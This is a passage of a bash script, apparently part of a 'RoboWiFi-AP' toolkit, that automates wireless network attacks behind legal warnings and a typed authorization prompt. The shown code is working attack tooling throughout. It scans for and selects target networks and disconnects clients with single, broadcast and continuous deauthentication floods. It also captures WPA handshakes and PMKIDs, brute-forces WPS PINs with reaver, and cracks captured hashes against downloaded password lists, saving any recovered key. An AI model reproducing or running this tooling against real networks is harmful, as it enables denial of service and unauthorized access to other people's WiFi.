#!/bin/bash

################################################################################
# Advanced WiFi Security Testing Framework
# Part of RoboWiFi-AP Security Assessment Framework
# 
# ⚠️  LEGAL WARNING: USE ONLY ON NETWORKS YOU OWN OR HAVE WRITTEN PERMISSION
# ⚠️  Unauthorized wireless network attacks are ILLEGAL
################################################################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Configuration
INTERFACE=""
MONITOR_INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
OUTPUT_DIR="$HOME/wifi_security_tests"
SESSION_DIR=""
ATTACK_MODE=""
WORDLIST=""
WORDLIST_DIR="$HOME/wordlists"

# Attack modes available
declare -A ATTACK_MODES=(
    ["1"]="handshake_capture"
    ["2"]="pmkid_attack"
    ["3"]="wps_attack"
    ["4"]="deauth_attack"
    ["5"]="evil_twin"
    ["6"]="automated_crack"
)

# Wordlist collection
declare -a WORDLISTS=()

# PIDs for cleanup
AIRODUMP_PID=""
REAVER_PID=""
CRACKING_PID=""

# Stats
HANDSHAKE_CAPTURED=false
PMKID_CAPTURED=false
WPS_SUCCESS=false
PASSWORDS_TESTED=0
START_TIME=""

################################################################################
# UTILITY FUNCTIONS
################################################################################

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    
    # Kill all background processes
    [ ! -z "$AIRODUMP_PID" ] && kill $AIRODUMP_PID 2>/dev/null
    [ ! -z "$REAVER_PID" ] && kill $REAVER_PID 2>/dev/null
    [ ! -z "$CRACKING_PID" ] && kill $CRACKING_PID 2>/dev/null
    
    # Kill any remaining aircrack processes
    pkill -9 airodump-ng 2>/dev/null
    pkill -9 aireplay-ng 2>/dev/null
    pkill -9 reaver 2>/dev/null
    pkill -9 aircrack-ng 2>/dev/null
    pkill -9 hashcat 2>/dev/null
    
    # Disable monitor mode
    if [ ! -z "$MONITOR_INTERFACE" ]; then
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
    fi
    
    # Restart networking
    systemctl restart NetworkManager 2>/dev/null
    
    # Show session summary
    show_session_summary
    
    echo -e "${GREEN}[+] Cleanup complete${NC}"
    exit 0
}

trap cleanup SIGINT SIGTERM

check_root() {
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[!] This script must be run as root${NC}"
        exit 1
    fi
}

show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║     Advanced WiFi Security Testing Framework v2.0               ║
║              Multi-Attack & Cracking System                      ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️${NC}"
    echo -e "${YELLOW}    Use only on networks you own or have written permission${NC}\n"
}

show_legal_warning() {
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}${BOLD}                    LEGAL WARNING                          ${NC}"
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}"
    echo "This tool performs aggressive security testing including:"
    echo "  • Network monitoring and packet capture"
    echo "  • Deauthentication attacks"
    echo "  • WPS brute force attacks"
    echo "  • Password dictionary attacks"
    echo "  • Evil twin access point creation"
    echo ""
    echo -e "${RED}Unauthorized use violates:${NC}"
    echo "  • Computer Fraud and Abuse Act (CFAA)"
    echo "  • Electronic Communications Privacy Act (ECPA)"
    echo "  • Wiretap Act"
    echo "  • Local and international cybercrime laws"
    echo ""
    echo -e "${YELLOW}Criminal penalties may include:${NC}"
    echo "  • Heavy fines (up to $250,000)"
    echo "  • Prison time (up to 20 years)"
    echo "  • Civil liability"
    echo ""
    echo -e "${GREEN}You MUST have:${NC}"
    echo "  ✓ Written authorization from network owner"
    echo "  ✓ Documented scope of testing"
    echo "  ✓ Legal counsel review (for professional testing)"
    echo ""
    echo -e "${RED}${BOLD}═══════════════════════════════════════════════════════════${NC}\n"
    
    echo -e "${YELLOW}Do you have WRITTEN AUTHORIZATION to test this network?${NC}"
    read -p "Type 'I HAVE AUTHORIZATION' to continue: " confirm
    
    if [ "$confirm" != "I HAVE AUTHORIZATION" ]; then
        echo -e "${RED}[!] Authorization not confirmed. Exiting.${NC}"
        exit 1
    fi
    
    echo -e "\n${YELLOW}Enter authorization reference/ticket number:${NC}"
    read -p "Reference: " auth_ref
    
    if [ -z "$auth_ref" ]; then
        echo -e "${RED}[!] No reference provided. Exiting.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Authorization logged: $auth_ref${NC}\n"
    sleep 2
}

check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    local required_tools=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng")
    local optional_tools=("reaver" "bully" "hashcat" "hcxdumptool" "hcxpcapngtool" "mdk4")
    local missing_required=()
    local missing_optional=()
    
    # Check required tools
    for tool in "${required_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${GREEN}  ✓ $tool${NC}"
        else
            echo -e "${RED}  ✗ $tool${NC}"
            missing_required+=("$tool")
        fi
    done
    
    # Check optional tools
    for tool in "${optional_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${GREEN}  ✓ $tool (optional)${NC}"
        else
            echo -e "${YELLOW}  - $tool (optional - some features disabled)${NC}"
            missing_optional+=("$tool")
        fi
    done
    
    if [ ${#missing_required[@]} -gt 0 ]; then
        echo -e "\n${RED}[!] Missing required tools: ${missing_required[*]}${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install aircrack-ng${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Core dependencies satisfied${NC}\n"
}

create_session_dir() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    SESSION_DIR="$OUTPUT_DIR/session_${timestamp}"
    mkdir -p "$SESSION_DIR"/{captures,wordlists,results,logs}
    
    START_TIME=$(date +%s)
    
    echo -e "${GREEN}[+] Session directory: $SESSION_DIR${NC}\n"
}

log_action() {
    local message="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$SESSION_DIR/logs/actions.log"
}

################################################################################
# INTERFACE MANAGEMENT
################################################################################

list_interfaces() {
    echo -e "${BLUE}[*] Available wireless interfaces:${NC}\n"
    
    local count=0
    while IFS= read -r line; do
        if [[ $line =~ ^[[:space:]]*([a-z0-9]+)[[:space:]] ]]; then
            iface="${BASH_REMATCH[1]}"
            if iw "$iface" info &>/dev/null; then
                count=$((count + 1))
                
                # Get interface details
                local driver=$(basename "$(readlink -f /sys/class/net/$iface/device/driver)" 2>/dev/null)
                local mac=$(cat /sys/class/net/$iface/address 2>/dev/null)
                
                echo -e "${GREEN}  [$count] $iface${NC}"
                echo -e "      MAC: ${CYAN}$mac${NC}"
                [ ! -z "$driver" ] && echo -e "      Driver: ${CYAN}$driver${NC}"
                
                # Check capabilities
                local phy=$(iw dev $iface info | grep wiphy | awk '{print $2}')
                if iw phy "phy${phy}" info 2>/dev/null | grep -q "monitor"; then
                    echo -e "      Monitor: ${GREEN}✓ Supported${NC}"
                else
                    echo -e "      Monitor: ${RED}✗ Not Supported${NC}"
                fi
                
                if iw phy "phy${phy}" info 2>/dev/null | grep -q "AP"; then
                    echo -e "      AP Mode: ${GREEN}✓ Supported${NC}"
                else
                    echo -e "      AP Mode: ${YELLOW}? Unknown${NC}"
                fi
                
                echo ""
            fi
        fi
    done < <(ip link show)
    
    if [ $count -eq 0 ]; then
        echo -e "${RED}[!] No wireless interfaces found${NC}"
        exit 1
    fi
}

select_interface() {
    list_interfaces
    
    read -p "Select interface: " selection
    
    if [[ "$selection" =~ ^[0-9]+$ ]]; then
        local count=0
        while IFS= read -r line; do
            if [[ $line =~ ^[[:space:]]*([a-z0-9]+)[[:space:]] ]]; then
                iface="${BASH_REMATCH[1]}"
                if iw "$iface" info &>/dev/null; then
                    count=$((count + 1))
                    if [ $count -eq $selection ]; then
                        INTERFACE="$iface"
                        break
                    fi
                fi
            fi
        done < <(ip link show)
    else
        INTERFACE="$selection"
    fi
    
    if ! iw "$INTERFACE" info &>/dev/null; then
        echo -e "${RED}[!] Invalid interface${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Selected: $INTERFACE${NC}\n"
    log_action "Selected interface: $INTERFACE"
}

enable_monitor_mode() {
    echo -e "${BLUE}[*] Enabling monitor mode...${NC}"
    
    # Kill interfering processes
    echo -e "${BLUE}[*] Stopping interfering processes...${NC}"
    airmon-ng check kill >/dev/null 2>&1
    
    # Enable monitor mode
    airmon-ng start "$INTERFACE" >/dev/null 2>&1
    
    # Determine monitor interface name
    if iwconfig "${INTERFACE}mon" 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE="${INTERFACE}mon"
    elif iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE="$INTERFACE"
    else
        echo -e "${RED}[!] Failed to enable monitor mode${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Monitor mode enabled: $MONITOR_INTERFACE${NC}\n"
    log_action "Monitor mode enabled: $MONITOR_INTERFACE"
    sleep 2
}

################################################################################
# NETWORK SCANNING
################################################################################

scan_networks() {
    echo -e "${BLUE}[*] Scanning for networks...${NC}"
    echo -e "${YELLOW}[*] Scanning for 45 seconds (Press Ctrl+C when you see target)${NC}\n"
    
    local scan_file="$SESSION_DIR/captures/scan"
    
    # Start airodump-ng with CSV output
    timeout 45 airodump-ng "$MONITOR_INTERFACE" -w "$scan_file" --output-format csv >/dev/null 2>&1
    
    if [ ! -f "${scan_file}-01.csv" ]; then
        echo -e "${RED}[!] Scan failed${NC}"
        return 1
    fi
    
    # Parse results
    echo -e "\n${GREEN}[+] Networks discovered:${NC}\n"
    echo -e "${CYAN}No.  BSSID              Ch  Enc      Pwr  WPS  Clients  ESSID${NC}"
    echo -e "${CYAN}---  -----------------  --  -------  ---  ---  -------  -----${NC}"
    
    local count=0
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        if [[ "$bssid" =~ ^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2} ]]; then
            count=$((count + 1))
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            privacy=$(echo "$privacy" | xargs)
            power=$(echo "$power" | xargs)
            essid=$(echo "$essid" | xargs)
            
            # Determine encryption type
            local enc_type="OPEN"
            if [[ "$privacy" =~ "WPA3" ]]; then
                enc_type="WPA3"
            elif [[ "$privacy" =~ "WPA2" ]]; then
                enc_type="WPA2"
            elif [[ "$privacy" =~ "WPA" ]]; then
                enc_type="WPA"
            elif [[ "$privacy" =~ "WEP" ]]; then
                enc_type="WEP"
            fi
            
            # Check WPS (would need wash scan, placeholder)
            local wps_status="-"
            
            # Count clients (from associated stations in CSV)
            local clients=0
            
            # Color code by security
            local color=$GREEN
            [ "$enc_type" = "WPA2" ] && color=$YELLOW
            [ "$enc_type" = "WPA3" ] && color=$RED
            [ "$enc_type" = "OPEN" ] && color=$CYAN
            
            printf "${color}%-4s${NC} %-18s %-3s %-8s %-4s %-4s %-8s %s\n" \
                "$count" "$bssid" "$channel" "$enc_type" "$power" "$wps_status" "$clients" "$essid"
            
            # Store for selection
            eval "NETWORK_${count}_BSSID=\"$bssid\""
            eval "NETWORK_${count}_CHANNEL=\"$channel\""
            eval "NETWORK_${count}_ESSID=\"$essid\""
            eval "NETWORK_${count}_ENC=\"$enc_type\""
        fi
    done < "${scan_file}-01.csv"
    
    if [ $count -eq 0 ]; then
        echo -e "${RED}[!] No networks found${NC}"
        return 1
    fi
    
    log_action "Scan completed: $count networks found"
    return 0
}

select_target() {
    echo -e "\n${BLUE}[*] Select target network:${NC}"
    read -p "Enter network number: " target_num
    
    TARGET_BSSID=$(eval echo "\$NETWORK_${target_num}_BSSID")
    TARGET_CHANNEL=$(eval echo "\$NETWORK_${target_num}_CHANNEL")
    TARGET_ESSID=$(eval echo "\$NETWORK_${target_num}_ESSID")
    TARGET_ENC=$(eval echo "\$NETWORK_${target_num}_ENC")
    
    if [ -z "$TARGET_BSSID" ]; then
        echo -e "${RED}[!] Invalid selection${NC}"
        exit 1
    fi
    
    echo -e "\n${GREEN}[+] Target selected:${NC}"
    echo -e "    ESSID:      ${CYAN}$TARGET_ESSID${NC}"
    echo -e "    BSSID:      ${CYAN}$TARGET_BSSID${NC}"
    echo -e "    Channel:    ${CYAN}$TARGET_CHANNEL${NC}"
    echo -e "    Encryption: ${CYAN}$TARGET_ENC${NC}\n"
    
    log_action "Target: $TARGET_ESSID ($TARGET_BSSID) CH:$TARGET_CHANNEL ENC:$TARGET_ENC"
}

################################################################################
# ATTACK METHODS
################################################################################

show_attack_menu() {
    echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              SELECT ATTACK METHOD                      ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    echo -e "${GREEN}[1]${NC} WPA/WPA2 Handshake Capture"
    echo -e "    ${CYAN}→ Capture 4-way handshake, then crack offline${NC}"
    echo -e "    ${CYAN}→ Best for: Most WPA2 networks${NC}\n"
    
    echo -e "${GREEN}[2]${NC} PMKID Attack (Hashcat)"
    echo -e "    ${CYAN}→ Capture PMKID without clients or handshake${NC}"
    echo -e "    ${CYAN}→ Best for: Networks with no active clients${NC}\n"
    
    echo -e "${GREEN}[3]${NC} WPS PIN Attack"
    echo -e "    ${CYAN}→ Brute force WPS PIN (if enabled)${NC}"
    echo -e "    ${CYAN}→ Best for: Routers with WPS enabled${NC}\n"
    
    echo -e "${GREEN}[4]${NC} Deauthentication Attack"
    echo -e "    ${CYAN}→ Disconnect clients from network${NC}"
    echo -e "    ${CYAN}→ Best for: Testing DoS protection${NC}\n"
    
    echo -e "${GREEN}[5]${NC} Evil Twin Attack"
    echo -e "    ${CYAN}→ Create fake AP to capture credentials${NC}"
    echo -e "    ${CYAN}→ Best for: Testing user awareness${NC}\n"
    
    echo -e "${GREEN}[6]${NC} Automated Multi-Attack"
    echo -e "    ${CYAN}→ Try multiple methods automatically${NC}"
    echo -e "    ${CYAN}→ Best for: Comprehensive testing${NC}\n"
    
    echo -e "${GREEN}[0]${NC} Back to main menu\n"
    
    read -p "Select attack [1-6]: " attack_choice
    ATTACK_MODE="${ATTACK_MODES[$attack_choice]}"
    
    if [ -z "$ATTACK_MODE" ] && [ "$attack_choice" != "0" ]; then
        echo -e "${RED}[!] Invalid selection${NC}"
        exit 1
    fi
}

# Attack 1: Handshake Capture
attack_handshake_capture() {
    echo -e "${BLUE}[*] Starting handshake capture attack...${NC}\n"
    
    local capture_file="$SESSION_DIR/captures/handshake"
    
    echo -e "${YELLOW}[*] Monitoring target network...${NC}"
    echo -e "${YELLOW}[*] Waiting for handshake (this may take a while)${NC}\n"
    
    # Start airodump-ng
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" \
        -w "$capture_file" "$MONITOR_INTERFACE" > "$SESSION_DIR/logs/airodump.log" 2>&1 &
    AIRODUMP_PID=$!
    
    sleep 5
    
    # Ask about deauth
    echo -e "${YELLOW}[?] Send deauth packets to speed up handshake capture?${NC}"
    read -p "This will temporarily disconnect clients [Y/n]: " deauth_choice
    
    if [[ ! "$deauth_choice" =~ ^[Nn]$ ]]; then
        echo -e "${GREEN}[+] Sending deauthentication packets...${NC}"
        
        # Send targeted deauth bursts
        for i in {1..3}; do
            echo -e "${CYAN}[*] Deauth burst $i/3${NC}"
            aireplay-ng --deauth 15 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" >/dev/null 2>&1
            sleep 10
        done
    fi
    
    echo -e "\n${CYAN}[*] Continuing to monitor for handshake...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C when handshake is captured or to stop${NC}\n"
    
    # Monitor for handshake
    while true; do
        if aircrack-ng "$capture_file"-*.cap 2>/dev/null | grep -q "1 handshake"; then
            echo -e "\n${GREEN}[+] HANDSHAKE CAPTURED!${NC}\n"
            HANDSHAKE_CAPTURED=true
            kill $AIRODUMP_PID 2>/dev/null
            log_action "Handshake captured successfully"
            break
        fi
        sleep 2
    done
}

# Attack 2: PMKID Attack
attack_pmkid() {
    echo -e "${BLUE}[*] Starting PMKID attack...${NC}\n"
    
    if ! command -v hcxdumptool &> /dev/null; then
        echo -e "${RED}[!] hcxdumptool not installed${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install hcxdumptool hcxtools${NC}"
        return 1
    fi
    
    local pmkid_file="$SESSION_DIR/captures/pmkid"
    
    echo -e "${YELLOW}[*] Attempting to capture PMKID...${NC}"
    echo -e "${YELLOW}[*] This attack doesn't require clients or handshake${NC}\n"
    
    # Capture PMKID (60 second timeout)
    timeout 60 hcxdumptool -i "$MONITOR_INTERFACE" -o "${pmkid_file}.pcapng" \
        --enable_status=1 --filterlist_ap="$TARGET_BSSID" 2>&1 | tee "$SESSION_DIR/logs/pmkid.log"
    
    if [ -f "${pmkid_file}.pcapng" ]; then
        # Convert to hashcat format
        hcxpcapngtool -o "${pmkid_file}.22000" "${pmkid_file}.pcapng" 2>/dev/null
        
        if [ -f "${pmkid_file}.22000" ] && [ -s "${pmkid_file}.22000" ]; then
            echo -e "\n${GREEN}[+] PMKID CAPTURED!${NC}"
            PMKID_CAPTURED=true
            log_action "PMKID captured successfully"
            return 0
        fi
    fi
    
    echo -e "${YELLOW}[-] No PMKID captured${NC}"
    return 1
}

# Attack 3: WPS Attack
attack_wps() {
    echo -e "${BLUE}[*] Starting WPS PIN attack...${NC}\n"
    
    if ! command -v reaver &> /dev/null; then
        echo -e "${RED}[!] Reaver not installed${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install reaver${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Testing if WPS is enabled...${NC}"
    
    # Check WPS with wash
    if command -v wash &> /dev/null; then
        timeout 30 wash -i "$MONITOR_INTERFACE" 2>/dev/null | grep "$TARGET_BSSID"
    fi
    
    echo -e "\n${YELLOW}[?] Continue with WPS attack?${NC}"
    echo -e "${CYAN}Note: This can take several hours${NC}"
    read -p "[y/N]: " wps_confirm
    
    if [[ ! "$wps_confirm" =~ ^[Yy]$ ]]; then
        return 1
    fi
    
    echo -e "${GREEN}[+] Starting Reaver attack...${NC}\n"
    
    # Run reaver
    reaver -i "$MONITOR_INTERFACE" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
        -vv -L -N -d 2 -T 0.5 -r 3:15 | tee "$SESSION_DIR/logs/reaver.log" &
    REAVER_PID=$!
    
    # Monitor reaver output
    tail -f "$SESSION_DIR/logs/reaver.log" &
    local tail_pid=$!
    
    wait $REAVER_PID
    kill $tail_pid 2>/dev/null
    
    # Check if successful
    if grep -q "WPS PIN:" "$SESSION_DIR/logs/reaver.log"; then
        echo -e "\n${GREEN}[+] WPS PIN FOUND!${NC}"
        WPS_SUCCESS=true
        log_action "WPS attack successful"
    fi
}

# Attack 4: Deauth Attack
attack_deauth() {
    echo -e "${BLUE}[*] Starting deauthentication attack...${NC}\n"
    
    echo -e "${YELLOW}[*] Attack options:${NC}"
    echo -e "  ${GREEN}[1]${NC} Targeted (single client)"
    echo -e "  ${GREEN}[2]${NC} Broadcast (all clients)"
    echo -e "  ${GREEN}[3]${NC} Continuous attack"
    read -p "Select [1-3]: " deauth_type
    
    case $deauth_type in
        1)
            read -p "Enter client MAC address: " client_mac
            echo -e "${GREEN}[+] Deauthing client: $client_mac${NC}"
            aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$client_mac" "$MONITOR_INTERFACE"
            ;;
        2)
            echo -e "${GREEN}[+] Deauthing all clients...${NC}"
            aireplay-ng --deauth 100 -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
            ;;
        3)
            echo -e "${GREEN}[+] Continuous deauth attack (Press Ctrl+C to stop)${NC}"
            aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONITOR_INTERFACE"
            ;;
    esac
    
    log_action "Deauth attack completed"
}

# Attack 5: Evil Twin
attack_evil_twin() {
    echo -e "${BLUE}[*] Evil Twin attack not yet implemented${NC}"
    echo -e "${YELLOW}[*] Use the main RoboWiFi-AP advanced features for this${NC}"
    log_action "Evil Twin attack attempted (not implemented)"
}

# Attack 6: Automated Multi-Attack
attack_automated() {
    echo -e "${BLUE}[*] Starting automated multi-attack...${NC}\n"
    
    echo -e "${YELLOW}[1/4] Attempting PMKID capture...${NC}"
    if attack_pmkid; then
        echo -e "${GREEN}[+] PMKID method successful${NC}"
    fi
    
    echo -e "\n${YELLOW}[2/4] Attempting handshake capture...${NC}"
    timeout 120 bash -c "$(declare -f attack_handshake_capture); attack_handshake_capture"
    
    if [ "$HANDSHAKE_CAPTURED" = true ]; then
        echo -e "${GREEN}[+] Handshake method successful${NC}"
    fi
    
    echo -e "\n${YELLOW}[3/4] Testing WPS...${NC}"
    # Quick WPS test (don't do full attack)
    if command -v wash &> /dev/null; then
        timeout 30 wash -i "$MONITOR_INTERFACE" 2>/dev/null | grep "$TARGET_BSSID"
    fi
    
    echo -e "\n${YELLOW}[4/4] All attacks completed${NC}"
    log_action "Automated multi-attack completed"
}

################################################################################
# PASSWORD CRACKING
################################################################################

setup_wordlists() {
    echo -e "${BLUE}[*] Setting up wordlists...${NC}\n"
    
    mkdir -p "$WORDLIST_DIR"
    
    # Scan for existing wordlists
    echo -e "${YELLOW}[*] Scanning for wordlists...${NC}"
    
    local count=0
    
    # Common wordlist locations
    local search_paths=(
        "$WORDLIST_DIR"
        "/usr/share/wordlists"
        "/usr/share/seclists"
        "$HOME"
        "."
    )
    
    for path in "${search_paths[@]}"; do
        if [ -d "$path" ]; then
            while IFS= read -r -d '' file; do
                local size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
                local size_mb=$((size / 1024 / 1024))
                
                if [ $size_mb -gt 0 ]; then
                    count=$((count + 1))
                    WORDLISTS+=("$file")
                    echo -e "${GREEN}  [$count]${NC} $(basename "$file") ${CYAN}(${size_mb}MB)${NC}"
                    echo -e "      Path: ${CYAN}$file${NC}"
                fi
            done < <(find "$path" -maxdepth 2 -type f \( -name "*.txt" -o -name "*.lst" -o -name "*wordlist*" -o -name "*password*" \) -print0 2>/dev/null)
        fi
    done
    
    if [ $count -eq 0 ]; then
        echo -e "${YELLOW}[!] No wordlists found${NC}\n"
        offer_download_wordlists
    else
        echo -e "\n${GREEN}[+] Found $count wordlists${NC}\n"
    fi
}

offer_download_wordlists() {
    echo -e "${YELLOW}[?] Would you like to download common wordlists?${NC}"
    echo -e "  ${GREEN}[1]${NC} rockyou.txt (134MB) - Most common"
    echo -e "  ${GREEN}[2]${NC} Top 10k passwords (40KB) - Quick test"
    echo -e "  ${GREEN}[3]${NC} Top 1M passwords (8MB) - Balanced"
    echo -e "  ${GREEN}[4]${NC} Skip"
    read -p "Select [1-4]: " dl_choice
    
    case $dl_choice in
        1)
            echo -e "${BLUE}[*] Downloading rockyou.txt...${NC}"
            wget -O "$WORDLIST_DIR/rockyou.txt.gz" \
                "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" 2>&1 | \
                grep -E --line-buffered "%" | sed -u 's/.*\([0-9]\+%\).*/\1/'
            gunzip "$WORDLIST_DIR/rockyou.txt.gz" 2>/dev/null
            WORDLISTS+=("$WORDLIST_DIR/rockyou.txt")
            ;;
        2)
            echo -e "${BLUE}[*] Downloading top 10k...${NC}"
            wget -O "$WORDLIST_DIR/10k-most-common.txt" \
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt"
            WORDLISTS+=("$WORDLIST_DIR/10k-most-common.txt")
            ;;
        3)
            echo -e "${BLUE}[*] Downloading top 1M...${NC}"
            wget -O "$WORDLIST_DIR/1M-most-common.txt" \
                "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
            WORDLISTS+=("$WORDLIST_DIR/1M-most-common.txt")
            ;;
    esac
}

crack_with_wordlists() {
    if [ ${#WORDLISTS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wordlists available${NC}"
        return 1
    fi
    
    echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║           PASSWORD CRACKING SESSION                    ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"
    
    # Determine what to crack
    local hash_file=""
    local hash_type=""
    
    if [ "$PMKID_CAPTURED" = true ]; then
        hash_file="$SESSION_DIR/captures/pmkid.22000"
        hash_type="22000"
        echo -e "${GREEN}[+] Using PMKID hash${NC}"
    elif [ "$HANDSHAKE_CAPTURED" = true ]; then
        hash_file="$SESSION_DIR/captures/handshake-01.cap"
        hash_type="2500"
        echo -e "${GREEN}[+] Using WPA handshake${NC}"
    else
        echo -e "${RED}[!] No hash to crack${NC}"
        return 1
    fi
    
    echo -e "${BLUE}[*] Select cracking method:${NC}"
    echo -e "  ${GREEN}[1]${NC} Aircrack-ng (traditional)"
    echo -e "  ${GREEN}[2]${NC} Hashcat (GPU accelerated)"
    echo -e "  ${GREEN}[3]${NC} Both (sequential)"
    echo -e "  ${GREEN}[4]${NC} Compare all wordlists"
    read -p "Select [1-4]: " crack_method
    
    case $crack_method in
        1)
            crack_with_aircrack "$hash_file"
            ;;
        2)
            crack_with_hashcat "$hash_file" "$hash_type"
            ;;
        3)
            crack_with_aircrack "$hash_file"
            crack_with_hashcat "$hash_file" "$hash_type"
            ;;
        4)
            compare_wordlists "$hash_file" "$hash_type"
            ;;
    esac
}

crack_with_aircrack() {
    local capture_file="$1"
    
    echo -e "\n${BLUE}[*] Cracking with aircrack-ng...${NC}\n"
    
    echo -e "${YELLOW}[*] Select wordlists to try:${NC}"
    for i in "${!WORDLISTS[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} $(basename "${WORDLISTS[$i]}")"
    done
    echo -e "  ${GREEN}[A]${NC} Try all wordlists"
    read -p "Select: " wl_choice
    
    local wordlists_to_try=()
    
    if [[ "$wl_choice" =~ ^[Aa]$ ]]; then
        wordlists_to_try=("${WORDLISTS[@]}")
    else
        local idx=$((wl_choice - 1))
        wordlists_to_try=("${WORDLISTS[$idx]}")
    fi
    
    for wordlist in "${wordlists_to_try[@]}"; do
        echo -e "\n${CYAN}[*] Trying: $(basename "$wordlist")${NC}"
        
        local start=$(date +%s)
        aircrack-ng "$capture_file" -w "$wordlist" -b "$TARGET_BSSID" | tee "$SESSION_DIR/results/aircrack_$(basename "$wordlist").log"
        local end=$(date +%s)
        local elapsed=$((end - start))
        
        if grep -q "KEY FOUND" "$SESSION_DIR/results/aircrack_$(basename "$wordlist").log"; then
            local password=$(grep "KEY FOUND" "$SESSION_DIR/results/aircrack_$(basename "$wordlist").log" | sed 's/.*\[ \(.*\) \]/\1/')
            echo -e "\n${GREEN}╔══════════════════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║            PASSWORD FOUND!                       ║${NC}"
            echo -e "${GREEN}╚══════════════════════════════════════════════════╝${NC}"
            echo -e "${GREEN}Network:  ${CYAN}$TARGET_ESSID${NC}"
            echo -e "${GREEN}Password: ${CYAN}$password${NC}"
            echo -e "${GREEN}Time:     ${CYAN}${elapsed}s${NC}"
            echo -e "${GREEN}Wordlist: ${CYAN}$(basename "$wordlist")${NC}\n"
            
            log_action "PASSWORD FOUND: $password (aircrack, ${elapsed}s)"
            
            # Save to results
            echo "Network: $TARGET_ESSID" > "$SESSION_DIR/results/password.txt"
            echo "BSSID: $TARGET_BSSID" >> "$SESSION_DIR/results/password.txt"
            echo "Password: $password" >> "$SESSION_DIR/results/password.txt"
            echo "Method: aircrack-ng" >> "$SESSION_DIR/results/password.txt"
            echo "Wordlist: $(basename "$wordlist")" >> "$SESSION_DIR/results/password.txt"
            echo "Time: ${elapsed}s" >> "$SESSION_DIR/results/password.txt"
            
            return 0
        fi
        
        echo -e "${YELLOW}[-] Not found in $(basename "$wordlist") (${elapsed}s)${NC}"
        PASSWORDS_TESTED=$((PASSWORDS_TESTED + $(wc -l < "$wordlist")))
    done
    
    echo -e "\n${RED}[!] Password not found in any wordlist${NC}"
    return 1
}

crack_with_hashcat() {
    local hash_file="$1"
    local hash_type="$2"
    
    if ! command -v hashcat &> /dev/null; then
        echo -e "${RED}[!] Hashcat not installed${NC}"
        return 1
    fi
    
    echo -e "\n${BLUE}[*] Cracking with Hashcat...${NC}\n"
    
    # Convert if needed
    if [ "$hash_type" = "2500" ]; then
        echo -e "${YELLOW}[*] Converting to hashcat format...${NC}"
        hcxpcaptool -z "$SESSION_DIR/captures/handshake.hc22000" "$hash_file" 2>/dev/null || \
        aircrack-ng "$hash_file" -J "$SESSION_DIR/captures/handshake" 2>/dev/null
        hash_file="$SESSION_DIR/captures/handshake.hc22000"
        hash_type="22000"
    fi
    
    echo -e "${YELLOW}[*] Select attack mode:${NC}"
    echo -e "  ${GREEN}[1]${NC} Dictionary attack"
    echo -e "  ${GREEN}[2]${NC} Dictionary + rules"
    echo -e "  ${GREEN}[3]${NC} Combinator attack"
    echo -e "  ${GREEN}[4]${NC} Mask attack (brute force)"
    read -p "Select [1-4]: " attack_mode
    
    case $attack_mode in
        1)
            hashcat_dictionary "$hash_file" "$hash_type"
            ;;
        2)
            hashcat_rules "$hash_file" "$hash_type"
            ;;
        3)
            hashcat_combinator "$hash_file" "$hash_type"
            ;;
        4)
